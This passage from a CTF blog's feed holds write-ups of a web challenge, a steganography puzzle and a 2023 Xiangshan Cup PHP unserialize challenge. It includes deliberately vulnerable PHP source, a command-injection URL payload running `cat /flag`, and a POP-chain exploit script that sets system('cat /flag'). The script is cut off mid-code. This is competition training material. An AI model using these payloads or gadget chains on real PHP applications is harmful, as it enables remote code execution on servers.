class=&#34;string&#34;&gt;&amp;quot;5050f6511ffb64e1914be4ca8b9d585c&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;]).&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;mkdir&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sandbox&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;chdir&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sandbox&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;title&amp;#x27;&lt;/span&gt;])&amp;amp;&amp;amp;&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$data&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt;= &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;title&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;strlen&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$data&lt;/span&gt;)&amp;gt;&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;||&lt;span class=&#34;title function_ invoke__&#34;&gt;strlen&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt;)&amp;gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;no!no!no!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;file_put_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sandbox&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$data&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;strlen&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt;)) &amp;lt;= &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;php &amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$sandbox&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;rm &amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$sandbox&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$title&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;no!no!no!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;reset&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/rm -rf &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$sandbox&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;使用数组绕过&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://172.10.0.5/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=1&amp;amp;title[]=1&amp;amp;data[]=%3C?=%20`cat%20/flag`;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;misc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc&#34;&gt;#&lt;/a&gt; misc&lt;/h1&gt;
&lt;h2 id=&#34;我的壁纸&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#我的壁纸&#34;&gt;#&lt;/a&gt; 我的壁纸&lt;/h2&gt;
&lt;p&gt;开局一张图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;1.png&#34; alt=&#34;image-20231115150355866&#34;&gt;&lt;/p&gt;
&lt;p&gt;binkwalk 提取获得三个文件并获得一个密码 &lt;code&gt;snowday&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;2.png&#34; alt=&#34;image-20231115151511809&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;3.png&#34; alt=&#34;image-20231115151613070&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据题目提示，txt 文件应该为 snow 隐写，wav 文件应该为 robot36&lt;/p&gt;
&lt;p&gt;txt 文件使用 SNOW 工具解密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;4.png&#34; alt=&#34;image-20231115152506755&#34;&gt;&lt;/p&gt;
&lt;p&gt;获得一部分 flag&lt;/p&gt;
&lt;p&gt;wav 文件使用手机 Robot36 工具听得到一个二维码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;5.png&#34; alt=&#34;image-20231115152622382&#34;&gt;&lt;/p&gt;
&lt;p&gt;扫码获得一部分 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;6.png&#34; alt=&#34;image-20231115152813339&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后的 jpeg 文件使用 010 打开得到 passwd_is_7hR@1nB0w$&amp;amp;8&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;7.png&#34; alt=&#34;image-20231115153243409&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用 steghide 解密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;8.png&#34; alt=&#34;image-20231115153226883&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;9.png&#34; alt=&#34;image-20231115153256570&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到最后一部分 flag&lt;/p&gt;
</content>
        <category term="ctf-web" scheme="https://c2young.github.io/tags/ctf-web/" />
        <category term="ctf-misc" scheme="https://c2young.github.io/tags/ctf-misc/" />
        <updated>2023-11-15T06:41:07.000Z</updated>
    </entry>
    <entry>
        <id>https://c2young.github.io/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AF-web-PHP-unserialize-pro/</id>
        <title>2023香山杯 web PHP_unserialize_pro</title>
        <link rel="alternate" href="https://c2young.github.io/2023/10/17/2023%E9%A6%99%E5%B1%B1%E6%9D%AF-web-PHP-unserialize-pro/"/>
        <content type="html">&lt;p&gt;源码如下&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;error_reporting&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Welcome&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$arg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;welcome&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;Wh0 4m I?&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;name == &lt;span class=&#34;string&#34;&gt;&amp;#x27;A_G00d_H4ck3r&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;arg;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;G00d&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$shell&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$cmd&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__invoke&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$shell&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;shell;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;cmd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/f|l|a|g|\*|\?/i&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$cmd&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;U R A BAD GUY&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$shell&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$cmd&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;H4ck3r&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$func&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__toString&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$function&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;func;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$function&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;观察代码，最后应该是需要进到 &lt;code&gt;G00d类&lt;/code&gt; 里面的 &lt;code&gt;__invoke()&lt;/code&gt;  来执行 eval 命令，触发 &lt;code&gt;__invoke()&lt;/code&gt;  需要把这个类当作函数来调用执行，所以需要进入到 &lt;code&gt;H4ck3r类&lt;/code&gt; 里面的 &lt;code&gt;__tostring()&lt;/code&gt; ，触发 &lt;code&gt;__tostring()&lt;/code&gt;  需要把这个类当作字符串来调用，刚好 &lt;code&gt;welcome类&lt;/code&gt; 里面的 &lt;code&gt;echo $this-&amp;gt;arg;&lt;/code&gt;  需要调用字符串，而其所在的 &lt;code&gt;__destruct()&lt;/code&gt;  是类实例化后销毁时会自动触发的。至此，完整的调用链为 &lt;code&gt;welcome类__destruct()&lt;/code&gt;  -&amp;gt;  &lt;code&gt;H4ck3r类__tostring()&lt;/code&gt;  -&amp;gt;  &lt;code&gt;G00d类__invoke()&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;welcome&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$arg&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;G00d&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$shell&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;cat /flag&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;H4ck3r&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$func&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;welcome&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;-&amp;gt;arg = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;H4ck3r&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;-&amp;gt;arg-&amp;gt;func = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;G00d&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span 